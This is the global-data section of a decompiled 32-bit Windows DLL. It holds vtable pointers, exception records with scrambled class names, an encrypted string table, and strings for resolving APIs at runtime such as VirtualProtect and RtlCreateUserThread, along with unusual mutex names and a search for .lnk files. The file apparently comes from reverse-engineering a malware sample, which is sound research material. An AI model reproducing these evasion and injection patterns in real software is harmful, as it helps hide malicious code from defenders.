int (__thiscall *off_10095068[3])(void *Block, char) = { &sub_1003510E, &sub_100351EC, &sub_10034CA0 }; // weak
int (__thiscall *off_1009506C[2])(void *Block, char) = { &sub_100351EC, &sub_10034CA0 }; // weak
int (__thiscall *off_10095070)(void *Block, char) = &sub_10034CA0; // weak
int (__thiscall *off_10095078)(void *Block, char) = &sub_10035557; // weak
int (__thiscall *off_100950AC)(void *Block, char) = &sub_10035643; // weak
__int16 word_100950E4[] = { 15581 }; // weak
int (__thiscall *off_100950F4[3])(void *Block, char) = { &sub_10037992, &sub_10037B5A, &sub_10039E62 }; // weak
int (__thiscall *off_100950F8[2])(void *Block, char) = { &sub_10037B5A, &sub_10039E62 }; // weak
int (__thiscall *off_100950FC)(void *Block, char) = &sub_10039E62; // weak
int (__thiscall *off_10095104)(void *Block, char) = &sub_10039ED3; // weak
int (__thiscall *off_1009510C[2])(void *Block, char) = { &sub_1003A382, &sub_1003A5D3 }; // weak
int (__thiscall *off_10095110)(void *Block, char) = &sub_1003A5D3; // weak
int (__thiscall *off_10095118)(void *Block, char) = &sub_1003A70C; // weak
int (__thiscall *off_1009513C)(void *Block, char) = &sub_1003A7A6; // weak
int (__thiscall *off_10095160)(void *Block, char) = &sub_1003AF22; // weak
int (__thiscall *off_10095184)(void *Block, char) = &sub_1003AFFA; // weak
int (__thiscall *off_100951A8)(void *Block, char) = &sub_1003B067; // weak
int (__thiscall *off_10095200)(void *Block, char) = &sub_1003B0FD; // weak
int (__thiscall *off_10095258)(void *Block, char) = &sub_1004148F; // weak
int (__thiscall *off_100952B4)(void *Block, char) = &sub_10041407; // weak
int (__thiscall *off_100952EC[2])(void *Block, char) = { &sub_1003B54D, &sub_1003D9B9 }; // weak
int (__thiscall *off_100952F0)(void *Block, char) = &sub_1003D9B9; // weak
int (__thiscall *off_1009531C[2])(void *Block, char) = { &sub_1003EE07, &unknown_libname_27 }; // weak
int (__thiscall *off_10095320)(void *Block, char) = &unknown_libname_27; // weak
int (__thiscall *off_10095340)(void *Block, char) = &unknown_libname_28; // weak
int (__thiscall *off_10095360)(void *Block, char) = &unknown_libname_29; // weak
int (__thiscall *off_10095380)(void *Block, char) = &sub_100413C6; // weak
int (__thiscall *off_100953E0)(void *Block, char) = &sub_100413E2; // weak
int (__thiscall *off_1009543C)(void *Block, char) = &sub_1003DA2C; // weak
int (__thiscall *off_10095474)(void *Block, char) = &unknown_libname_30; // weak
int (__thiscall *off_10095494)(void *Block, char) = &sub_1003DA65; // weak
int (__thiscall *off_100954CC)(void *Block, char) = &unknown_libname_31; // weak
int (__thiscall *off_100954F0)(void *Block, char) = &sub_10041423; // weak
int (__thiscall *off_1009554C)(void *Block, char) = &sub_1003DA9E; // weak
int (__thiscall *off_10095584)(void *Block, char) = &unknown_libname_32; // weak
int (__thiscall *off_100955A4)(void *Block, char) = &unknown_libname_33; // weak
int (__thiscall *off_100955C8)(void *Block, char) = &sub_10041449; // weak
int (__thiscall *off_10095624)(void *Block, char) = &sub_1003DAF4; // weak
int (__thiscall *off_1009565C)(void *Block, char) = &unknown_libname_34; // weak
int (__thiscall *off_1009567C)(void *Block, char) = &unknown_libname_35; // weak
int (__thiscall *off_1009569C)(void *Block, char) = &sub_1003DB4A; // weak
int (__thiscall *off_100956D4)(void *Block, char) = &unknown_libname_36; // weak
int (__thiscall *off_100956F4)(void *Block, char) = &unknown_libname_37; // weak
int (__thiscall *off_10095714)(void *Block, char) = &sub_1003EDEA; // weak
int (__thiscall *off_10095734)(void *Block, char) = &sub_1003EE23; // weak
int (__thiscall *off_10095754)(void *Block, char) = &sub_1003EE3F; // weak
int (__thiscall *off_10095774)(void *Block, char) = &sub_1003EE5B; // weak
int (__thiscall *off_10095794)(void *Block, char) = &sub_1003EE77; // weak
int (__thiscall *off_100957B4)(void *Block, char) = &sub_1003EE93; // weak
int (__thiscall *off_100957D4)(void *Block, char) = &sub_1003EEAF; // weak
int (__thiscall *off_100957F4)(void *Block, char) = &sub_1003EECB; // weak
int (__thiscall *off_10095814)(void *Block, char) = &sub_1003EEE7; // weak
int (__thiscall *off_10095834)(void *Block, char) = &sub_1003EF03; // weak
int (__thiscall *off_10095854)(void *Block, char) = &sub_1003EF1F; // weak
_UNKNOWN unk_10095874; // weak
const IID stru_10095884 = { 0u, 0u, 0u, { 192u, 0u, 0u, 0u, 0u, 0u, 0u, 70u } }; // idb
const IID stru_10095894 = { 2610977138u, 63144u, 4559u, { 164u, 66u, 0u, 160u, 201u, 10u, 143u, 57u } }; // idb
int (__thiscall *off_100958A8)(void *Block, char) = &sub_10041E46; // weak
int (__thiscall *off_100958B0)(void *Block, char) = &sub_100420CB; // weak
int (__thiscall *off_100958B8)(void *Block, char) = &sub_100420E7; // weak
int (__thiscall *off_100958C0)(void *Block, char) = &sub_10042FC5; // weak
int (__thiscall *off_1009591C)(void *Block, char) = &sub_10042676; // weak
int (__thiscall *off_10095954)(void *Block, char) = &unknown_libname_38; // weak
int (__thiscall *off_10095974)(void *Block, char) = &unknown_libname_39; // weak
int (__thiscall *off_10095994)(void *Block, char) = &sub_10042A22; // weak
int (__thiscall *off_100959B4)(void *Block, char) = &sub_10042A3E; // weak
int (__thiscall *off_100959D8)(void *Block, char) = &sub_10044A3F; // weak
int (__thiscall *off_10095A38)(void *Block, char) = &sub_100431CB; // weak
int (__thiscall *off_10095A90)(void *Block, char) = &sub_10043E2A; // weak
int (__thiscall *off_10095AC8)(void *Block, char) = &unknown_libname_40; // weak
int (__thiscall *off_10095AE8)(void *Block, char) = &unknown_libname_41; // weak
int (__thiscall *off_10095B08)(void *Block, char) = &sub_100441D6; // weak
int (__thiscall *off_10095B28)(void *Block, char) = &sub_100441F2; // weak
int (__thiscall *off_10095B48)(void *Block, char) = &unknown_libname_42; // weak
int (__thiscall *off_10095B58)(void *Block, char) = &sub_100475DE; // weak
int (__thiscall *off_10095BB4)(void *Block, char) = &unknown_libname_43; // weak
int (__thiscall *off_10095BC0)(void *Block, char) = &unknown_libname_44; // weak
int (__thiscall *off_10095BCC)(void *Block, char) = &unknown_libname_45; // weak
int (__thiscall *off_10095BE0)(void *Block, char) = &sub_100450F8; // weak
int (__thiscall *off_10095BEC)(void *Block, char) = &sub_100452D5; // weak
int (__thiscall *off_10095BF8)(void *Block, char) = &sub_100458F8; // weak
int (__thiscall *off_10095C04)(void *Block, char) = &sub_10045C5E; // weak
int (__thiscall *off_10095C18)(void *Block, char) = &sub_10046709; // weak
int (__thiscall *off_10095C50)(void *Block, char) = &unknown_libname_46; // weak
int (__thiscall *off_10095C70)(void *Block, char) = &unknown_libname_47; // weak
int (__thiscall *off_10095C90)(void *Block, char) = &sub_10046B6B; // weak
int (__thiscall *off_10095CB0)(void *Block, char) = &sub_10046B87; // weak
_UNKNOWN unk_10095CD0; // weak
_UNKNOWN unk_10095CE0; // weak
_UNKNOWN unk_10095CF0; // weak
_UNKNOWN unk_10095D00; // weak
_UNKNOWN unk_10095D10; // weak
int (__thiscall *off_10095D20[2])(void *Block, char) = { &sub_10047E90, &unknown_libname_48 }; // weak
int (__thiscall *off_10095D24)(void *Block, char) = &unknown_libname_48; // weak
int (__stdcall *off_10095D2C)(int, int, int) = &sub_10048358; // weak
int (__thiscall *off_10095D4C)(void *Block, char) = &sub_10048130; // weak
int (__thiscall *off_10095D54)(void *Block, char) = &unknown_libname_50; // weak
int (__thiscall *off_10095D78)(void *Block, char) = &unknown_libname_51; // weak
int (__thiscall *off_10095D94)(void *Block, char) = &unknown_libname_52; // weak
int (__thiscall *off_10095DB4)(void *Block, char) = &sub_10048BCB; // weak
int (__thiscall *off_10095DD0)(void *Block, char) = &sub_1004907D; // weak
int (__thiscall *off_10095DF0)(void *Block, char) = &sub_10049885; // weak
_UNKNOWN unk_10095E14; // weak
_UNKNOWN unk_10095E24; // weak
_UNKNOWN unk_10095E34; // weak
_UNKNOWN unk_10095E44; // weak
_UNKNOWN unk_1009627C; // weak
const _ThrowInfo _TI1_AV_xho_fdflj__ = { 0u, &sub_1004B370, NULL, &_CTA1_AV_xho_fdflj__ }; // idb
const _ThrowInfo _TI1_AVSnsziibtx_sr__ = { 0u, &sub_1001646C, NULL, &_CTA1_AVSnsziibtx_sr__ }; // idb
const _ThrowInfo _TI2_AVTyxCkOnhqdgZuatyxcko_sr__ = { 0u, &sub_100166BD, NULL, &_CTA2_AVTyxCkOnhqdgZuatyxcko_sr__ }; // idb
const _ThrowInfo _TI2_AVDkpOsublklbcJnkmkirtg_sr__ = { 0u, &sub_1000BCBF, NULL, &_CTA2_AVDkpOsublklbcJnkmkirtg_sr__ }; // idb
const _ThrowInfo _TI2_AVScdeiYyksupovo_sr__ = { 0u, &sub_1000CA99, NULL, &_CTA2_AVScdeiYyksupovo_sr__ }; // idb
const _ThrowInfo _TI2_AVHfpmmmiamaHpnxxaqhf_sr__ = { 0u, &sub_1001666B, NULL, &_CTA2_AVHfpmmmiamaHpnxxaqhf_sr__ }; // idb
const _ThrowInfo _TI5_AVWdtfAhnEcxcvFuptgwdtf_jhzi_sr__ = { 0u, &sub_10010985, NULL, &_CTA5_AVWdtfAhnEcxcvFuptgwdtf_jhzi_sr__ }; // idb
__TI_flags _TI5_AVBjzgFbjdoadXvizrkOkabjzgfb_jhzi_sr__ = 0; // weak
const _ThrowInfo _TI4_AVQdlyUQBeskfuooz_jhzi_sr__ = { 0u, &sub_10010B65, NULL, &_CTA4_AVQdlyUQBeskfuooz_jhzi_sr__ }; // idb
const _ThrowInfo _TI5_AVCsszWkelsgXqduhacss_jhzi_sr__ = { 0u, &sub_100125B3, NULL, &_CTA5_AVCsszWkelsgXqduhacss_jhzi_sr__ }; // idb
const _ThrowInfo _TI5_AVDynkdllNfnaPydyqhdgDynkdllnf_jhzi_sr__ = { 0u, &sub_10012782, NULL, &_CTA5_AVDynkdllNfnaPydyqhdgDynkdllnf_jhzi_sr__ }; // idb
const _ThrowInfo _TI2_AVGfnpwoMadjdwvkl_sr__ = { 0u, &sub_10016613, NULL, &_CTA2_AVGfnpwoMadjdwvkl_sr__ }; // idb
const _ThrowInfo _TI2_AVVkleVkdoghmczMqygvklev_vwfp_qlp_pqesih_sr__ =
{
  0u,
  &sub_10012EA7,
  NULL,
  &_CTA2_AVVkleVkdoghmczMqygvklev_vwfp_qlp_pqesih_sr__
}; // idb
const _ThrowInfo _TI2_AVKugkdNnUifqbYgkugkdnn_sr__ = { 0u, &sub_10016764, NULL, &_CTA2_AVKugkdNnUifqbYgkugkdnn_sr__ }; // idb
const _ThrowInfo _TI2_AVMxpteqpIoxoylsrdYuvyamxpt_sr__ = { 0u, &sub_10012E01, NULL, &_CTA2_AVMxpteqpIoxoylsrdYuvyamxpt_sr__ }; // idb
const _ThrowInfo _TI2_AVVJVzywhgyue_sr__ = { 0u, &sub_10010B78, NULL, &_CTA2_AVVJVzywhgyue_sr__ }; // idb
const _ThrowInfo _TI2_AVBpqonlefcdQdwemTtnqbpqon_kzwdu_sr__ = { 0u, &sub_1002A157, NULL, &_CTA2_AVBpqonlefcdQdwemTtnqbpqon_kzwdu_sr__ }; // idb
const _ThrowInfo _TI2_AVSajslyasyjrZUGifsasajs_kzwdu_sr__ = { 0u, &sub_1002A06A, NULL, &_CTA2_AVSajslyasyjrZUGifsasajs_kzwdu_sr__ }; // idb
const _ThrowInfo _TI2_AVNkwvkskhoJvvsaNkwvkskho_bjxssd_sr__ = { 0u, &sub_1002A309, NULL, &_CTA2_AVNkwvkskhoJvvsaNkwvkskho_bjxssd_sr__ }; // idb
const _ThrowInfo _TI2_AVBtedofbPwtdhdgkk_bjxssd_sr__ = { 0u, &sub_1002A35B, NULL, &_CTA2_AVBtedofbPwtdhdgkk_bjxssd_sr__ }; // idb
const _ThrowInfo _TI3_AVLfeuifzffjRpmufflxh_ezrqwlx_sr__ = { 0u, &sub_10018CE5, NULL, &_CTA3_AVLfeuifzffjRpmufflxh_ezrqwlx_sr__ }; // idb
const _ThrowInfo _TI2_AVDehafrYfplitlVwgdehAfryfplit_gfjjefwq_sr__ = { 0u, &sub_1002EBDF, NULL, &_CTA2_AVDehafrYfplitlVwgdehAfryfplit_gfjjefwq_sr__ }; // idb
const _ThrowInfo _TI2_AVBhkofbHwqNblcfnVsjwbhkof_gfjjefwq_sr__ = { 0u, &sub_1002EB8D, NULL, &_CTA2_AVBhkofbHwqNblcfnVsjwbhkof_gfjjefwq_sr__ }; // idb
const _ThrowInfo _TI2_AVOzxflwtlqlhGovvrdoxa_oqymxuuz_sr__ = { 0u, &sub_1002F2A6, NULL, &_CTA2_AVOzxflwtlqlhGovvrdoxa_oqymxuuz_sr__ }; // idb
const _ThrowInfo _TI3_AVNxgFdIyuzpwZmeagwnxg_yq_sr__ = { 0u, &sub_1001CB6E, NULL, &_CTA3_AVNxgFdIyuzpwZmeagwnxg_yq_sr__ }; // idb
const _ThrowInfo _TI1_AVXbaxizGuimmJkzwxbaxi_Xrtioo_bjxssd_sr__ = { 0u, &sub_1001DAD7, NULL, &_CTA1_AVXbaxizGuimmJkzwxbaxi_Xrtioo_bjxssd_sr__ }; // idb
const _ThrowInfo _TI2_AVRnaLirybajtn_sr__ = { 0u, &sub_100167DB, NULL, &_CTA2_AVRnaLirybajtn_sr__ }; // idb
__TI_flags _TI5_AVHzsnwtmRbderjskb_jhzi_sr__ = 0; // weak
const _ThrowInfo _TI2_AVUwwroNiqrrorTaapnauww_yq_sr__ = { 0u, &sub_1002253D, NULL, &_CTA2_AVUwwroNiqrrorTaapnauww_yq_sr__ }; // idb
const _ThrowInfo _TI2_AVEtKqstreari_gfjjefwq_sr__ = { 0u, &sub_1002EACA, NULL, &_CTA2_AVEtKqstreari_gfjjefwq_sr__ }; // idb
const _ThrowInfo _TI3_AVUPQaqbVhsrnozqr_jhzi_sr__ = { 0u, &sub_10027F9A, NULL, &_CTA3_AVUPQaqbVhsrnozqr_jhzi_sr__ }; // idb
const _ThrowInfo _TI2_AVDybrxgFqcfonPmswmegdy_gfjjefwq_sr__ = { 0u, &sub_10028730, NULL, &_CTA2_AVDybrxgFqcfonPmswmegdy_gfjjefwq_sr__ }; // idb
__TI_flags _TI2_AVYitzioIvrugxaFjqyitzio_gfjjefwq_sr__ = 0; // weak
const _ThrowInfo _TI4_AVWdlkztgsnlAzzaqwwdlKztgsnlaz_ezrqwlx_sr__ = { 0u, &sub_1002D8B3, NULL, &_CTA4_AVWdlkztgsnlAzzaqwwdlKztgsnlaz_ezrqwlx_sr__ }; // idb
const _ThrowInfo _TI4_AVXcyfvsawkyZkgVqxqXcyfvsawKyzkgvqxq_ezrqwlx_sr__ =
{
  0u,
  &sub_1002E44C,
  NULL,
  &_CTA4_AVXcyfvsawkyZkgVqxqXcyfvsawKyzkgvqxq_ezrqwlx_sr__
}; // idb
__TI_flags _TI3_AVTohkuixgRflZavycpWtohkuIxgrflzav_qsbdzsml_sr__ = 0; // weak
const _ThrowInfo _TI2_AVInuqrrgqIzqrxemfn_qsbdzsml_sr__ = { 0u, &sub_10037721, NULL, &_CTA2_AVInuqrrgqIzqrxemfn_qsbdzsml_sr__ }; // idb
const _ThrowInfo _TI3_AVGvwHrhkGkbWwpxiPqhcwgvwh_qsbdzsml_sr__ = { 0u, &sub_10037865, NULL, &_CTA3_AVGvwHrhkGkbWwpxiPqhcwgvwh_qsbdzsml_sr__ }; // idb
const _ThrowInfo _TI3_AVDvyHnthghyKltbjqChpwdvyhn_qsbdzsml_sr__ = { 0u, &sub_100378B6, NULL, &_CTA3_AVDvyHnthghyKltbjqChpwdvyhn_qsbdzsml_sr__ }; // idb
const _ThrowInfo _TI3_AVRcclrLlnuKrzOsvviGrcclrlln_qsbdzsml_sr__ = { 0u, &sub_100377C3, NULL, &_CTA3_AVRcclrLlnuKrzOsvviGrcclrlln_qsbdzsml_sr__ }; // idb
const _ThrowInfo _TI3_AVXsbqaAtiqgxcIvskflXaxsbqaat_qsbdzsml_sr__ = { 0u, &sub_10037814, NULL, &_CTA3_AVXsbqaAtiqgxcIvskflXaxsbqaat_qsbdzsml_sr__ }; // idb
const _ThrowInfo _TI4_AVAoubmBglPnbiMzvxptraa_cah_sr__ = { 0u, &sub_10033309, NULL, &_CTA4_AVAoubmBglPnbiMzvxptraa_cah_sr__ }; // idb
const _ThrowInfo _TI3_AVFqpgtZkqrTzylfxafQpgtzkqrt_qsbdzsml_sr__ = { 0u, &sub_10037772, NULL, &_CTA3_AVFqpgtZkqrTzylfxafQpgtzkqrt_qsbdzsml_sr__ }; // idb
const _ThrowInfo _TI2_AVZdhrnpldcahnGvqzdhRnpldcahn_gfjjefwq_sr__ = { 0u, &sub_1002EB3B, NULL, &_CTA2_AVZdhrnpldcahnGvqzdhRnpldcahn_gfjjefwq_sr__ }; // idb
const _ThrowInfo _TI3_AVOaciVrczxgUcrvluwoa_Gvknob_zwqqelb_wztxn__ = { 0u, &sub_10041FFF, NULL, &_CTA3_AVOaciVrczxgUcrvluwoa_Gvknob_zwqqelb_wztxn__ }; // idb
int (__cdecl *off_100B5000)(_DWORD, _DWORD) = &sub_1004B3B0; // weak
VARIANTARG pvarg = { { { 10u, 0u, 0u, 0u, { 2147614724i64 } } } }; // idb
int dword_100B5090 = -1153374642; // weak
int dword_100B50A8 = -1; // weak
void *off_100B5D40 = &unk_100BFAC0; // weak
int dword_100B5FE0 = 28800; // weak
int dword_100B5FE4 = 1; // weak
int dword_100B5FE8 = -3600; // weak
void *off_100B6070 = &unk_100B5FF0; // weak
int dword_100B6094 = 1024; // weak
int dword_100B6098 = -1023; // weak
int dword_100B609C = 53; // weak
int dword_100B60A0 = 11; // weak
int dword_100B60A4 = 64; // weak
int dword_100B60A8 = 1023; // weak
int dword_100B60AC = 128; // weak
int dword_100B60B0 = -127; // weak
int dword_100B60B4 = 24; // weak
int dword_100B60B8 = 8; // weak
int dword_100B60BC = 32; // weak
int dword_100B60C0 = 127; // weak
_UNKNOWN unk_100B6424; // weak
_UNKNOWN unk_100B643F; // weak
_UNKNOWN unk_100B6440; // weak
_UNKNOWN unk_100B6480; // weak
_UNKNOWN unk_100B6481; // weak
_UNKNOWN unk_100B6482; // weak
_UNKNOWN unk_100B6483; // weak
_UNKNOWN unk_100B64D1; // weak
_UNKNOWN unk_100B64D2; // weak
_UNKNOWN unk_100B64D3; // weak
_UNKNOWN unk_100B64DB; // weak
_UNKNOWN unk_100B64E5; // weak
_UNKNOWN unk_100B64FD; // weak
_UNKNOWN unk_100B64FE; // weak
_UNKNOWN unk_100B64FF; // weak
_UNKNOWN unk_100B650A; // weak
_UNKNOWN unk_100B650B; // weak
_UNKNOWN unk_100B6540; // weak
_UNKNOWN unk_100B6588; // weak
_UNKNOWN unk_100B6604; // weak
_UNKNOWN unk_100B663C; // weak
wchar_t asc_100B6660[2] = L"."; // weak
_UNKNOWN unk_100B6667; // weak
_UNKNOWN unk_100B6668; // weak
_UNKNOWN unk_100B6669; // weak
_UNKNOWN unk_100B666A; // weak
_UNKNOWN unk_100B666B; // weak
_UNKNOWN unk_100B666C; // weak
_UNKNOWN unk_100B666D; // weak
_UNKNOWN unk_100B666E; // weak
_UNKNOWN unk_100B666F; // weak
_UNKNOWN unk_100B6670; // weak
_UNKNOWN unk_100B6671; // weak
_UNKNOWN unk_100B6672; // weak
_UNKNOWN unk_100B6673; // weak
_UNKNOWN unk_100B6674; // weak
_UNKNOWN unk_100B6675; // weak
_UNKNOWN unk_100B6676; // weak
_UNKNOWN unk_100B6677; // weak
_UNKNOWN unk_100B6678; // weak
_UNKNOWN unk_100B6679; // weak
_UNKNOWN unk_100B667A; // weak
_UNKNOWN unk_100B667B; // weak
_UNKNOWN unk_100B667C; // weak
_UNKNOWN unk_100B667D; // weak
_UNKNOWN unk_100B667E; // weak
_UNKNOWN unk_100B667F; // weak
_UNKNOWN unk_100B6734; // weak
_UNKNOWN unk_100B6768; // weak
_UNKNOWN unk_100B67B8; // weak
_UNKNOWN unk_100B67F0; // weak
_UNKNOWN unk_100B682C; // weak
_UNKNOWN unk_100B6868; // weak
_UNKNOWN unk_100B68A8; // weak
_UNKNOWN unk_100B6900; // weak
_UNKNOWN unk_100B6954; // weak
char byte_100B698F = '\0'; // weak
_UNKNOWN unk_100B6990; // weak
_UNKNOWN unk_100B69E8; // weak
wchar_t word_100B6A2C[2] = { 0u, 0u }; // weak
wchar_t word_100B6A30[2] = { 0u, 0u }; // weak
wchar_t word_100B6A34[2] = { 0u, 0u }; // weak
wchar_t word_100B6A38[2] = { 0u, 0u }; // weak
wchar_t word_100B6A3C[2] = { 0u, 0u }; // weak
wchar_t word_100B6A40[2] = { 0u, 0u }; // weak
wchar_t word_100B6A44 = 0u; // weak
_UNKNOWN unk_100B6A47; // weak
wchar_t word_100B6A48 = 0u; // weak
_UNKNOWN unk_100B6A4A; // weak
_UNKNOWN unk_100B6A4B; // weak
int dword_100B6A4C = 0; // weak
wchar_t word_100B6A50 = 0u; // weak
_UNKNOWN unk_100B6A52; // weak
_UNKNOWN unk_100B6A53; // weak
wchar_t word_100B6A58[2] = { 0u, 0u }; // weak
wchar_t word_100B6A5C[2] = { 0u, 0u }; // weak
wchar_t word_100B6A60[2] = { 0u, 0u }; // weak
wchar_t word_100B6A64[4] = { 0u, 0u, 0u, 0u }; // weak
_UNKNOWN unk_100B6A6C; // weak
wchar_t aNtdllDll_5[10] = L"ntdll.dll"; // weak
_UNKNOWN unk_100B6ABC; // weak
_UNKNOWN unk_100B6AF0; // weak
_UNKNOWN unk_100B6B48; // weak
wchar_t aLnk[4] = L"lnk"; // weak
wchar_t asc_100B6B7C[5] = L"\\*.*"; // weak
wchar_t asc_100B6B94[2] = L"\\"; // weak
_UNKNOWN unk_100B6BFE; // weak
_UNKNOWN unk_100B6BFF; // weak
_UNKNOWN unk_100B6C09; // weak
_UNKNOWN unk_100B6C0A; // weak
_UNKNOWN unk_100B6C0B; // weak
_UNKNOWN unk_100B6C16; // weak
_UNKNOWN unk_100B6C17; // weak
_UNKNOWN unk_100B6C21; // weak
_UNKNOWN unk_100B6C22; // weak
_UNKNOWN unk_100B6C23; // weak
_UNKNOWN unk_100B6C39; // weak
_UNKNOWN unk_100B6C3A; // weak
_UNKNOWN unk_100B6C3B; // weak
_UNKNOWN unk_100B6C42; // weak
_UNKNOWN unk_100B6C43; // weak
_UNKNOWN unk_100B6C4C; // weak
_UNKNOWN unk_100B6C7C; // weak
_UNKNOWN unk_100B6CAC; // weak
_UNKNOWN unk_100B6CDC; // weak
_UNKNOWN unk_100B6D0C; // weak
_UNKNOWN unk_100B6D3C; // weak
WCHAR Class = 0u; // idb
wchar_t word_100B6D70[140] =
{
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  0u,
  49395u,
  3680u,
  38766u,
  49502u,
  38386u,
  35619u,
  16217u,
  49224u,
  25617u,
  22u,
  41688u,
  59437u,
  14209u,
  36309u,
  60208u,
  21119u,
  48368u,
  14144u,
  45539u,
  15452u,
  49887u,
  0u,
  48814u,
  438u,
  13091u,
  51641u,
  6980u,
  17310u,
  26267u,
  25101u,
  0u,
  0u,
  27090u,
  20872u,
  4373u,
  42505u,
  32352u,
  17077u,
  46903u,
  41224u,
  41007u,
  20u,
  41671u,
  59452u,
  14200u,
  36309u,
  60175u,
  21126u,
  48374u,
  14175u,
  45522u,
  15451u,
  0u,
  887u,
  39404u,
  18655u,
  6631u,
  33231u,
  47811u,
  51804u,
  45697u,
  0u,
  43597u,
  34338u,
  24576u,
  59398u,
  43440u,
  22361u,
  33946u,
  54027u,
  12327u,
  24u,
  41709u,
  59433u,
  14209u,
  36303u,
  60192u,
  21130u,
  48311u,
  14124u,
  45471u,
  15451u,
  49894u,
  22913u,
  0u,
  65428u,
  729u,
  34101u,
  44564u,
  49785u,
  47241u,
  40170u,
  47341u,
  0u,
  14106u,
  20581u,
  23364u,
  11363u,
  11286u,
  807u,
  48826u,
  16559u,
  34820u,
  24u,
  41709u,
  59433u,
  14209u,
  36303u,
  60192u,
  21130u,
  48311u,
  14124u,
  45471u,
  15451u,
  49894u,
  22913u,
  0u,
  35431u,
  53419u,
  16463u,
  38725u,
  28971u,
  11109u,
  49955u,
  15163u,
  0u
}; // weak
_UNKNOWN unk_100B6E88; // weak
_UNKNOWN unk_100B6ED0; // weak
wchar_t word_100B6F0C[8] = { 0u, 0u, 0u, 0u, 0u, 0u, 0u, 0u }; // weak
wchar_t asc_100B6F1C[2] = L"."; // weak
wchar_t word_100B6F20[2] = { 0u, 0u }; // weak
wchar_t word_100B6F24[4] = { 0u, 0u, 0u, 0u }; // weak
CHAR aNtdllDll_2[] = "ntdll.dll"; // idb
_UNKNOWN unk_100B6F38; // weak
wchar_t aRtlexpandenvir[30] = L"RtlExpandEnvironmentStrings_U"; // weak
wchar_t aRtlinitunicode[21] = L"RtlInitUnicodeString"; // weak
_UNKNOWN unk_100B6FEC; // weak
wchar_t asc_100B701C[2] = L"\\"; // weak
wchar_t word_100B7020[2] = { 0u, 0u }; // weak
wchar_t word_100B7024 = 0u; // weak
char byte_100B7027 = '\x01'; // weak
_UNKNOWN unk_100B7028; // weak
_UNKNOWN unk_100B7068; // weak
_UNKNOWN unk_100B70A0; // weak
_UNKNOWN unk_100B70E0; // weak
_UNKNOWN unk_100B7110; // weak
_UNKNOWN unk_100B7148; // weak
_UNKNOWN unk_100B7180; // weak
wchar_t aNtdllDll_1[10] = L"ntdll.dll"; // weak
_UNKNOWN unk_100B722C; // weak
_UNKNOWN unk_100B7268; // weak
_UNKNOWN unk_100B7288; // weak
wchar_t aKernel32Dll_0[13] = L"kernel32.dll"; // weak
wchar_t aVirtualfree_1[12] = L"VirtualFree"; // weak
wchar_t aGetprocaddress_0[15] = L"GetProcAddress"; // weak
_UNKNOWN unk_100B7306; // weak
_UNKNOWN unk_100B7307; // weak
wchar_t aGetmodulehandl_1[17] = L"GetModuleHandleA"; // weak
_UNKNOWN unk_100B732A; // weak
_UNKNOWN unk_100B732B; // weak
wchar_t aOpenthread[11] = L"OpenThread"; // weak
_UNKNOWN unk_100B7342; // weak
wchar_t aExitthread_0[11] = L"ExitThread"; // weak
wchar_t aKernel32Dll_5[13] = L"kernel32.dll"; // weak
wchar_t aVirtualfree_2[12] = L"VirtualFree"; // weak
wchar_t aExitthread_1[11] = L"ExitThread"; // weak
_UNKNOWN unk_100B73A8; // weak
wchar_t aNtdllDll_3[10] = L"ntdll.dll"; // weak
_UNKNOWN unk_100B7418; // weak
wchar_t word_100B7478[2] = { 0u, 0u }; // weak
wchar_t aThPoolShdPqomg[30] = L"TH_POOL_SHD_PQOMGMN_%dSYNCMTX"; // weak
wchar_t word_100B74B8[2] = { 0u, 0u }; // weak
wchar_t aThPoolShdMtxGm[27] = L"TH_POOL_SHD_MTX_GMN94XQ_%d"; // weak
wchar_t aRtlcreateusert[20] = L"RtlCreateUserThread"; // weak
wchar_t aNtdllDll_4[10] = L"ntdll.dll"; // weak
wchar_t aGetmodulehandl_0[17] = L"GetModuleHandleW"; // weak
wchar_t word_100B7608[2] = { 0u, 0u }; // weak
wchar_t asc_100B760C[3] = L"%X"; // weak
wchar_t asc_100B7614[2] = L"\""; // weak
_UNKNOWN unk_100B7618; // weak
wchar_t asc_100B7670[2] = L"\""; // weak
wchar_t asc_100B7674[2] = L" "; // weak
WCHAR StringSecurityDescriptor[] = L"S:(ML;;NW;;;LW)"; // idb
wchar_t word_100B76AC[2] = { 0u, 0u }; // weak
_UNKNOWN unk_100B76B0; // weak
_UNKNOWN unk_100B76F0; // weak
_UNKNOWN unk_100B7748; // weak
_UNKNOWN unk_100B7790; // weak
char a123[6] = "1.2.3"; // weak
_UNKNOWN unk_100B77DC; // weak
wchar_t word_100B7808[2] = { 0u, 0u }; // weak
wchar_t word_100B780C[2] = { 0u, 0u }; // weak
_UNKNOWN unk_100B7810; // weak
_UNKNOWN unk_100B7860; // weak
wchar_t word_100B78B0[2] = { 0u, 0u }; // weak
wchar_t aKernel32Dll_1[13] = L"kernel32.dll"; // weak
char aExitthread[11] = "ExitThread"; // weak
char aUnmapviewoffil[16] = "UnmapViewOfFile"; // weak
char aVirtualfree[12] = "VirtualFree"; // weak
wchar_t word_100B78F8[2] = { 0u, 0u }; // weak
wchar_t aUpdtSyncMtxTme[31] = L"UPDT_SYNC_MTX_TME_ON_OFF_%d_%d"; // weak
WCHAR aKernel32Dll_2[] = L"kernel32.dll"; // idb
WCHAR aNtdllDll_0[] = L"ntdll.dll"; // idb
char aVirtualalloc[13] = "VirtualAlloc"; // weak
char aSleep[6] = "Sleep"; // weak
char aVirtualfree_0[12] = "VirtualFree"; // weak
char aVirtualprotect[15] = "VirtualProtect"; // weak
char aLoadlibrarya[13] = "LoadLibraryA"; // weak
char aGetprocaddress[15] = "GetProcAddress"; // weak
char aGetmodulehandl[17] = "GetModuleHandleA"; // weak
char aMemcpy[7] = "memcpy"; // weak
char aMemset[7] = "memset"; // weak
char aFreelibrary[12] = "FreeLibrary"; // weak
char aOpenmutexw[11] = "OpenMutexW"; // weak
char aCreatefilemapp[19] = "CreateFileMappingW"; // weak
char aMapviewoffile[14] = "MapViewOfFile"; // weak
char aUnmapviewoffil_0[16] = "UnmapViewOfFile"; // weak
char aCreatemutexw[13] = "CreateMutexW"; // weak
char aWaitforsingleo[20] = "WaitForSingleObject"; // weak
char aClosehandle[12] = "CloseHandle"; // weak
char aNtqueryinforma[26] = "NtQueryInformationProcess"; // weak
char aGetlasterror[13] = "GetLastError"; // weak
char aReleasemutex[13] = "ReleaseMutex"; // weak
char aOpenfilemappin[17] = "OpenFileMappingW"; // weak
char aLoadlibraryw[13] = "LoadLibraryW"; // weak
char aCreatefilew[12] = "CreateFileW"; // weak
